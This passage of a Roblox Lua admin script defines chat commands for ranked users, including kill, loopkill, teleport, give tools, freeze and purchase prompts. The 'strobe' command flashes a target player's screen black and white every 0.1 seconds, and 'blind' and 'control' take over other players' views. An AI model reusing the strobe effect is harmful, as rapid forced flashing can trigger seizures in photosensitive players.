							if ExistingData == nil then
								ExistingData = Instance.new("Configuration")
							end
							ExistingData.Name = "Player Data"
							local Key = Instance.new("Configuration", ExistingData)
							Key.Name = Data
							Player:SaveInstance("Data", ExistingData)
						end
					end
				end
			
				if string.sub(Message, 1, 10+#Bet) == "removenote"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 11+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Data = Arg2
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local ExistingData = Player:LoadInstance("Data")
							if ExistingData ~= nil then
								if Data == "all" then
									ExistingData:ClearAllChildren()
								else
									for _,DataObj in pairs(ExistingData:GetChildren()) do
										if string.sub(string.lower(DataObj.Name),1,#Data) == string.lower(Data) then
											DataObj:Destroy()
										end
									end
								end
								Player:SaveInstance("Data", ExistingData)
							end
						end
					end
				end
				
				if string.sub(Message,1,8+#Bet) == "loopkill"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 9+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Times = tonumber(Arg2)
					for _,Player in pairs(Players) do
						coroutine.wrap(function()
							for i = 1,Times do
								if Player ~= nil then
									if Player.Character ~= nil then
										Player.Character:BreakJoints()
									end
									local Stop = game.Workspace:FindFirstChild("brandon's Loopkill Stop")
									if Stop then
										if Stop:IsA("StringValue") then
											if string.lower(Stop.Value) == string.lower(Player.Name) then
												Stop:Destroy()
												break
											end
										end
									end
								end
								wait(5.1)
							end
						end)()
					end
				end
				
				if string.sub(Message,1,10+#Bet) == "noloopkill"..Bet then
					local Players = Scan(string.sub(Message, 11+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local Stop = game.Workspace:FindFirstChild("brandon's Loopkill Stop") if Stop then Stop:Destroy() end
							Stop = Instance.new("StringValue", Workspace) Stop.Name = "brandon's Loopkill Stop" Stop.Value = string.lower(Player.Name)
						end
					end
				end
				
				if string.sub(Message, 1, 2+#Bet) == "sm"..Bet then
					for _,Player in pairs(Players:GetPlayers()) do
						SendMessage(Player, "SYSTEM MESSAGE", string.sub(RawMessage, 2+#Bet), 3)
					end
				end
				
				if string.sub(Message, 1, 10+#Bet) == "accelerate"..Bet then
					local Players = Scan(string.sub(Message, 11+#Bet), Speaker)
					for _,Player in pairs(Players) do 
						if Player ~= nil then
							TS:Teleport(68464644, Player)
						end
					end
				end
				
			end
			
			if Rank == "Owner" or Rank == "Admin" or Rank == "Member" then
				-- Member Commands --
				
				if Message == "test" then
					SendMessage(Speaker, "Test", "Test complete! brandonisabillionare's Admin works fine!", 3)
				end
				
				if Message == "logs" then
					ListGui(Speaker, Logs)
				end
				
				if string.sub(Message, 1, 1+#Bet) == "m"..Bet then
					for _,Player in pairs(Players:GetPlayers()) do
						SendMessage(Player, "Message from "..Speaker.Name, string.sub(RawMessage, 2+#Bet), 5)
					end
				end
				
				if string.sub(Message, 1, 1+#Bet) == "h"..Bet then
					for _,Player in pairs(Players:GetPlayers()) do
						SendHint(Player, string.sub(RawMessage, 2+#Bet), 5)
					end
				end
				
				if string.sub(Message, 1, 4+#Bet) == "kill"..Bet and DisabledAbuse() == false then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								Player.Character:BreakJoints()
							end
						end
					end
				end
				
				if string.sub(Message, 1, 3+#Bet) == "age"..Bet then
					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							SendMessage(Speaker, Player.Name.."'s Age", Player.Name.." is "..FindAge(Player.AccountAge).." old", 4)
						end
					end
				end
				
				if string.sub(Message,1,2+#Bet) == "ff"..Bet then
					local Players = Scan(string.sub(Message, 3+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								Instance.new("ForceField", Player.Character)
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "unff"..Bet or string.sub(Message,1,4+#Bet) == "noff"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								for _,Get in pairs(Player.Character:GetChildren()) do
									if Get:IsA("ForceField") then
										Get:Destroy()
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,7+#Bet) == "respawn"..Bet then
					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							Player:LoadCharacter()
						end
					end
				end
				
				if string.sub(Message,1,3+#Bet) == "hat"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 4+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if ID ~= nil then
									local Object = game:GetService("InsertService"):LoadAsset(ID)
									for _,Obj in pairs(Object:GetChildren()) do if Obj:IsA("Hat") then Obj.Parent = Player.Character end end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "gear"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Backpack ~= nil then
								if ID ~= nil then
									local Object = game:GetService("InsertService"):LoadAsset(ID)
									for _,Obj in pairs(Object:GetChildren()) do if Obj:IsA("Tool") or Obj:IsA("HopperBin") then Obj.Parent = Player.Character end end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "sword"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Backpack ~= nil then
								if Player.Character ~= nil then
									local Object = game:GetService("InsertService"):LoadAsset(125013769)
									Object:GetChildren()[1].Parent = Player.Character
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,7+#Bet) == "ragdoll"..Bet then
					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid:Destroy()
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,3+#Bet) == "god"..Bet then
					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.MaxHealth = math.huge
									Player.Character.Humanoid.Health = math.huge
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "nogod"..Bet or string.sub(Message,1,5+#Bet) == "ungod"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.MaxHealth = 100
									Player.Character.Humanoid.Health = 100
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "char"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = tonumber(Arg2) or 0
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Arg2 == "reset" then
								ID = Player.userId
							end
							if Player.Character ~= nil then
								local Position = Player.Character.Torso.Position
								Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..ID
								wait() Player:LoadCharacter() wait()
								Player.Character:MoveTo(Position)
							end
						end
					end
				end
				
				if string.sub(Message,1,2+#Bet) == "tp"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 3+#Bet), Bet) if not Arg1 and Arg2 then return end
					local PlayersFrom = Scan(Arg1, Speaker)
					local PlayersTo = Scan(Arg2, Speaker)
					if PlayersFrom and PlayersTo then
						for _,PlayerFrom in pairs(PlayersFrom) do
							if PlayerFrom ~= nil then
								for _,PlayerTo in pairs(PlayersTo) do
									if PlayerTo ~= nil then
										if PlayerFrom.Character and PlayerTo.Character then
											PlayerFrom.Character:MoveTo(PlayerTo.Character.Torso.Position)
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message, 1, 5+#Bet) == "blind"..Bet and DisabledAbuse() == false then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.PlayerGui ~= nil then
								local SG = Player.PlayerGui:FindFirstChild("brandon'sA Screen Cover") if SG ~= nil then SG:Destroy() end
								SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon'sA Screen Cover"
								local Frame = Instance.new("Frame", SG) Frame.Name = "Overlay" Frame.Size = UDim2.new(1,0,1,0) Frame.BackgroundColor3 = Color3.new(0,0,0) Frame.ZIndex = 100
							end	
						end
					end
				end
				
				if string.sub(Message, 1, 7+#Bet) == "noblind"..Bet then
					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.PlayerGui ~= nil then
								local SG = Player.PlayerGui:FindFirstChild("brandon'sA Screen Cover") if SG ~= nil then SG:Destroy() end
							end	
						end
					end
				end
				
				if string.sub(Message, 1, 6+#Bet) == "strobe"..Bet and DisabledAbuse() == false then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.PlayerGui ~= nil then
								local SG = Player.PlayerGui:FindFirstChild("brandon'sA Screen Cover") if SG ~= nil then SG:Destroy() end
								SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon'sA Screen Cover"
								local Frame = Instance.new("Frame", SG) Frame.Name = "Overlay" Frame.Size = UDim2.new(1,0,1,0) Frame.ZIndex = 100
								coroutine.wrap(function() repeat Frame.BackgroundColor3 = Color3.new(0,0,0) wait(0.1) Frame.BackgroundColor3 = Color3.new(1,1,1) wait(0.1) until not SG end)()
							end	
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "point"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
					local PlayersFrom = Scan(Arg1, Speaker)
					local PlayersTo = Scan(Arg2, Speaker)
					if PlayersFrom and PlayersTo then
						for _,PlayerFrom in pairs(PlayersFrom) do
							if PlayerFrom ~= nil then
								for _,PlayerTo in pairs(PlayersTo) do
									if PlayerTo ~= nil then
										if PlayerFrom.Character and PlayerTo.Character then
											if PlayerFrom.Character:FindFirstChild("Humanoid") and PlayerTo.Character:FindFirstChild("Torso") then coroutine.wrap(function()
												local Laser = Instance.new("SelectionPartLasso", PlayerFrom.Character) Laser.Humanoid = PlayerFrom.Character.Humanoid Laser.Part = PlayerTo.Character.Torso Laser.Color = BrickColor.Random()
												wait(5)
												Laser:Destroy()
											end)() end 
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "merge"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
					local PlayersFrom = Scan(Arg1, Speaker)
					local PlayersTo = Scan(Arg2, Speaker)
					if PlayersFrom and PlayersTo then
						for _,PlayerFrom in pairs(PlayersFrom) do
							if PlayerFrom ~= nil then
								for _,PlayerTo in pairs(PlayersTo) do
									if PlayerTo ~= nil then
										if PlayerFrom.Character and PlayerTo.Character then
											PlayerFrom.Character = PlayerTo.Character
										end
									end
								end
							end
						end
					end
				end
			
				if string.sub(Message,1,5+#Bet) == "speed"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Speed = tonumber(Arg2)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.WalkSpeed = Speed
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "health"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 7+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Health = tonumber(Arg2)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									if LocalDisableAbuse == false then
										Player.Character.Humanoid.Health = Health
									else
										if Health < 0.00001 then
											SendMessage(Speaker, "Command Disabled", "You have attempted to set a health below 0, This is considered abusive while disabling abusive commands is disabled.", 10)
										else
											Player.Character.Humanoid.Health = Health
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "give"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Object = Arg2
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local BuildTools = {73089166, 73089190, 73089204, 73089214, 73089239, 73089259, 58921588}
							local BaseBuildTools = {["Move"] = "GameTool", ["Clone"] = "Clone", ["Delete"] = "Hammer"}
							if Object == "psbtools" then
								if LocalDisableAbuse == false then
									for _,Tool in pairs(BuildTools) do
										local ToolObject = game:GetService("InsertService"):LoadAsset(Tool)
										ToolObject:GetChildren()[1].Parent = Player.Backpack
									end
								else
									SendMessage(Speaker, "Command Disabled", "In the settings of brandonModelMak".."e".."r's Admin, Disabling abusive commands is active. Please try '"..Prefix.."give"..Bet.."player"..Bet.."basicbtools",6)
								end
							elseif Object == "basicbtools" then
								for Name,Type in pairs(BaseBuildTools) do
									local Tool = Instance.new("HopperBin", Player.Backpack)
									Tool.Name = Name
									Tool.BinType = Type
								end
							elseif Object == "btools" then
								if LocalDisableAbuse == false then
									for Name,Type in pairs(BaseBuildTools) do
										local Tool = Instance.new("HopperBin", Player.Backpack)
										Tool.Name = Name
										Tool.BinType = Type
									end
									for _,Tool in pairs(BuildTools) do
										local ToolObject = game:GetService("InsertService"):LoadAsset(Tool)
										ToolObject:GetChildren()[1].Parent = Player.Backpack
									end
								else
									SendMessage(Speaker, "Command Disabled", "In the settings of Brandon's Admin, Disabling abusive commands is active. Please try '"..Prefix.."give"..Bet.."player"..Bet.."basicbtools",6)
								end
							else
								local Regions = {Lighting}
								for _,Region in pairs(Regions) do
									for _,Item in pairs(Region:GetChildren()) do
										if Item:IsA("HopperBin") or Item:IsA("Tool") then
											if Object == "all" then
												local NewItem = Item:Clone()
												NewItem.Parent = Player.Backpack
											else
												if string.sub(string.lower(Item.Name),1,#Object) == string.lower(Object) then
													local NewItem = Item:Clone()
													NewItem.Parent = Player.Backpack
												end
											end
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,7+#Bet) == "control"..Bet and DisabledAbuse() == false then
					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								local Position = Player.Character.Torso.Position
								Speaker.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Player.userId
								wait() Speaker:LoadCharacter() wait()
								Speaker.Character:MoveTo(Position)
								local Dead = false
								local function ViewPlayer(Char)
									wait()
									if Dead == true then return end
									Char:ClearAllChildren()
									Execute(LocalScript, Player.Backpack, Player, "script.Parent = nil Workspace.CurrentCamera.CameraSubject = game.Players['"..tostring(Speaker.Name).."'].Character.Humanoid Workspace.CurrentCamera.CameraType = 'Custom'")
								end
								local function ResetChar()
									wait()
									if Dead == true then return end
									Speaker.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Speaker.userId
									Dead = true
									ViewPlayer = function() end
									ResetChar = function() end
									wait(0.1)
									Speaker:LoadCharacter()
									wait(0.1)
									Player:LoadCharacter()
								end
								Player.CharacterAdded:connect(ViewPlayer)
								Speaker.CharacterAdded:connect(ResetChar)
								ViewPlayer(Player.Character)
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "time"..Bet then
					local Time = string.sub(Message,6)
					if Time == "day" or Time == "noon" then Time = "12" end
					if Time == "night" or Time == "midnight" then Time = "0" end
					if Time == "dawn" or Time == "morning" then Time = "6:15" end
					if Time == "dusk" or Time == "evening" then Time = "17:45" end
					if Time == "afternoon" then Time = "15:30" end
				pcall(function() game.Lighting.TimeOfDay = Time end)
				end
				
				if string.sub(Message,1,4+#Bet) == "team"..Bet then
					if string.sub(Message,5+#Bet,8+#Bet) == "new"..Bet then
						local NewTeam = Instance.new("Team", Teams)
						NewTeam.TeamColor = BrickColor.random()
						NewTeam.Name = string.sub(RawMessage,9+#Bet)
					end
					if string.sub(Message,5+#Bet,9+#Bet) == "join"..Bet then
						local Arg1, Arg2 = GetSplit(string.sub(Message, 10+#Bet), Bet) if not Arg1 and Arg2 then return end
						local Players = Scan(Arg1, Speaker)
						local TeamName = Arg2
						if string.lower(TeamName) == "none" then
							for _,Player in pairs(Players) do
								if Player ~= nil then
									Player.Neutral = true
								end
							end
						else
							for _,Obj in pairs(Teams:GetChildren()) do
								if Obj:IsA("Team") then
									if string.sub(string.lower(Obj.Name),1,#TeamName) == string.lower(TeamName) then
										for _,Player in pairs(Players) do
											if Player ~= nil then
												Player.Neutral = false
												Player.TeamColor = Obj.TeamColor
											end
										end
									end
								end
							end
						end
					end
					if string.sub(Message,5+#Bet,11+#Bet) == "rename"..Bet then
						local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 12+#Bet), Bet) if not Arg1 and Arg2 then return end
						local TeamName = Arg1
						local NewName = Arg2
						for _,Obj in pairs(Teams:GetChildren()) do
							if Obj:IsA("Team") then
								if string.sub(string.lower(Obj.Name),1,#TeamName) == string.lower(TeamName) then
									Obj.Name = NewName
								end
							end
						end
					end
					if string.sub(Message,5+#Bet,11+#Bet) == "remove"..Bet then
						local TeamName = string.sub(Message, 12+#Bet)
						for _,Obj in pairs(Teams:GetChildren()) do
							if Obj:IsA("Team") then
								if string.sub(string.lower(Obj.Name),1,#TeamName) == string.lower(TeamName) then
									for _,Player in pairs(Players:GetPlayers()) do
										if Player.TeamColor == Obj.TeamColor then
											Player.Neutral = true
										end
									end
									Obj:Destroy()
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "name"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local NewName = Arg2
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character.Humanoid ~= nil then
									local Head = nil
									pcall(function() Head = Player.Character.Label:GetChildren()[1].Head end)
									if not Head then Head = Player.Character.Head end
									local HeadClone = Head:Clone()
									Head.Transparency = 1
									pcall(function() Player.Character.Label:Destroy(); Head = Player.Character.Head end)
									
									pcall(function() Head.face.Transparency = 1 end)
									
									local Label = Instance.new("Model", Player.Character)
									Label.Name = "Label"
									
									local Model = Instance.new("Model", Label)
									Model.Name = NewName
									
									local HumanoidClone = Instance.new("Humanoid", Model)
									coroutine.wrap(function() while wait() do HumanoidClone.Health = Player.Character.Humanoid.Health; HumanoidClone.MaxHealth = Player.Character.Humanoid.MaxHealth; end end)()
									
									HeadClone.Parent = Model
									HeadClone.Position = Vector3.new(0,100,0)
									HeadClone.CanCollide = false
									
									local Weld = Instance.new("Weld", HeadClone)
									Weld.Part0 = HeadClone
									Weld.Part1 = Head
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "noname"..Bet then
					local Players = Scan(string.sub(RawMessage, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								local Head = Player.Character:FindFirstChild("Label")
								if Head then Head:Destroy() end
								local Head = Player.Character:FindFirstChild("Head")
								if Head then Head.Transparency = 0 if Head:FindFirstChild("Face") then Head.face.Transparency = 0 end end
							end
						end
					end
				end
				
				if string.sub(Message,1,7+#Bet) == "product"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 8+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Item = tonumber(Arg2)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							PromptPurchase(Player, Item)
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "debug"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								local Position = nil
								if Player.Character:FindFirstChild("Torso") then Position = Player.Character.Torso.Position end
								Player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Player.userId
								wait() Player:LoadCharacter() wait()
								if Position then Player.Character:MoveTo(Position) end
								wait(0.1) Execute(LocalScript, Player.Character, Player, [[Workspace.CurrentCamera.FieldOfView = 70]])
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "clone"..Bet and DisabledAbuse() == false then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil and Player.Character:FindFirstChild("Torso") ~= nil then
								Player.Character.Archivable = true
								local Clone = Player.Character:Clone()
								Player.Character.Archivable = false
								Clone.Parent = Workspace
								Clone:MoveTo(Clone.Torso.Position)
								Clone:MakeJoints()
								table.insert(Objects, Clone)
							end
						end
					end
				end
				
				if string.sub(Message,1,5+#Bet) == "sound"..Bet then
					local SoundID, Pitch = string.sub(Message, 6+#Bet), 1
					for Name,ID in pairs({["Tech"] = 140949250, ["Skrillex"] = 142479895, ["Try it out"] = 142479895, ["Bangarang"] = 142319852, ["Radioactive"] = 131111368, ["Monsters"] = 142718349, ["Mario"] = 138246809, ["Fox"] = 130797915, ["Gangnam"] = 130844430, ["Blue"] = 131198720, ["I'm blue"] = 131198720, ["Fus ro dah"] = 130776150, ["Gey"] = 131201443, ["Started"] = 138134680, ["Neon lights"] = 143772118, ["Spitfire"] = 129490596, ["Fade"] = 129542833, ["Gifted"] = 129548418}) do
						if SoundID == string.lower(Name) then SoundID = ID end
					end
					if SoundID == 131201443 then Pitch = -1 end
					local Sound = Workspace:FindFirstChild("brandonisabillionare's Admin Sound")
					if Sound then if Sound:IsA("Sound") then Sound:Stop() Sound:Destroy() end end
					Sound = Instance.new("Sound", Workspace) Sound.Name = "brandonisabillionare's Admin Sound" Sound.Volume = 1 Sound.SoundId = "http://www.roblox.com/asset/?id="..SoundID Sound.Looped = true Sound.Pitch = Pitch Sound.Archivable = false coroutine.wrap(function() repeat Sound:Play() wait(2.5) Sound:Stop() wait(0.5) Sound:Play() until Sound.IsPlaying or not Sound end)()
				end
				
				if string.sub(Message,1,7) == "nosound" then
					local Sound = Workspace:FindFirstChild("brandonisabillionare's Admin Sound")
					if Sound then if Sound:IsA("Sound") then Sound:Stop() wait() Sound:Destroy() end end
				end
				
				if string.sub(Message,1,6+#Bet) == "freeze"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.WalkSpeed = 0
									for _,Object in pairs(Player.Character:GetChildren()) do if Object:IsA("BasePart") then
										Object.Anchored = true
									end end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,8+#Bet) == "nofreeze"..Bet then
					local Players = Scan(string.sub(Message, 9+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.WalkSpeed = 16
									for _,Object in pairs(Player.Character:GetChildren()) do if Object:IsA("BasePart") then
										Object.Anchored = false
									end end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,8+#Bet) == "forwards"..Bet then
					local Players = Scan(string.sub(Message, 9+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.WalkSpeed = 16
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,9+#Bet) == "backwards"..Bet then
					local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.WalkSpeed = -16
								end
							end
						end
					end
				end
				
				if string.sub(Message, 1, 9+#Bet) == "shownotes"..Bet or string.sub(Message, 1, 9+#Bet) == "loadnotes"..Bet then
					local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
					local DataSet = {}
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local ExistingData = Player:LoadInstance("Data")
							if ExistingData ~= nil then
								if #ExistingData:GetChildren() ~= 0 then
									for _,Data in pairs(ExistingData:GetChildren()) do
										table.insert(DataSet, Player.Name..": "..Data.Name)
									end
								else
									table.insert(DataSet, "Data does not exist for "..Player.Name)
								end
							else
								table.insert(DataSet, "Data does not exist for "..Player.Name)
							end
						end
					end
					ListGui(Speaker, DataSet)
				end
				
				if string.sub(Message,1,7+#Bet) == "notools"..Bet then
					local Players = Scan(string.sub(Message, 8+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Backpack ~= nil then
								Player.Backpack:ClearAllChildren()
							end
							if Player.Character ~= nil then
								for _,Obj in pairs(Player.Character:GetChildren()) do
									if Obj:IsA("Tool") or Obj:IsA("HopperBin") then
										Obj:Destroy()
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,6+#Bet) == "nohats"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								for _,Obj in pairs(Player.Character:GetChildren()) do
									if Obj:IsA("Hat") then
										Obj:Destroy()
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,9+#Bet) == "taketools"..Bet then
					local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Backpack ~= nil then
								if Speaker.Backpack ~= nil then
									for _,Object in pairs(Player.Backpack:GetChildren()) do
										if Object:IsA("Tool") or Object:IsA("HopperBin") then
											local Clone = Object:Clone()
											Clone.Parent = Speaker.Backpack
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,9+#Bet) == "givetools"..Bet then
					local Players = Scan(string.sub(Message, 10+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Backpack ~= nil then
								if Speaker.Backpack ~= nil then
									for _,Object in pairs(Speaker.Backpack:GetChildren()) do
										if Object:IsA("Tool") or Object:IsA("HopperBin") then
											local Clone = Object:Clone()
											Clone.Parent = Player.Backpack
										end
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "heal"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character:FindFirstChild("Humanoid") ~= nil then
									Player.Character.Humanoid.MaxHealth = 100
									Player.Character.Humanoid.Health = 100
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,4+#Bet) == "face"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local ID = Arg2
					if tonumber(Arg2) ~= nil then
						ID = GetImageFormat(tonumber(ID))
					else
						for FaceTable,FaceID in pairs({[{":3", "=3", ";3"}] = "45448697", [{":D", "=D", ";D"}] = "40528907", [{"D:", "D=", "D;"}] = "147285493", [{":(", "=(", ";(", "):", ")=", ");"}] = "67493660", [{":)", "=)", ";)", "(:", "(=", "(;"}] = "41420967", [{":o", "=o", ";o", "o:", "o=", "o;", ":0", "=0", ";0", "0:", "0=", "0;"}] = "14995229", [{":P", "=P", ";P"}] = "35853859", [{":/", "=/", ";/", "/:", "/=", "/;", [[:\]], [[=\]], [[;\]], [[\:]], [[\=]], [[\;]]}] = "141764028", [{":I", "=I", ";I", "I:", "I=", "I;", ":|", "=|", ";|", "|:", "|=", "|;"}] = "14922431"}) do
							for _,Face in pairs(FaceTable) do
								if string.lower(Arg2) == string.lower(Face) then
									ID = FaceID
									break
								end
							end
						end
					end
					for _,Player in pairs(Players) do
						if Player ~= nil then
							if Player.Character ~= nil then
								if Player.Character.Head ~= nil then
									if Player.Character.Head.face ~= nil then
										Player.Character.Head.face.Texture = "http://www.roblox.com/asset/?id="..ID
										pcall(function() Player.Character.Label:GetChildren()[1].Head.Texture = "http://www.roblox.com/asset/?id="..ID end)
									end
								end
							end
						end
					end
				end
				
				if string.sub(Message,1,2+#Bet) == "pm"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 3+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local MessageArg = Arg2
					for _,Player in pairs(Players) do
						if Player ~= nil then
							SendMessage(Player, "Message from "..Speaker.Name, MessageArg, 5)
						end
					end
				end
				
				if string.sub(Message,1,3+#Bet) == "fly"..Bet then
					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
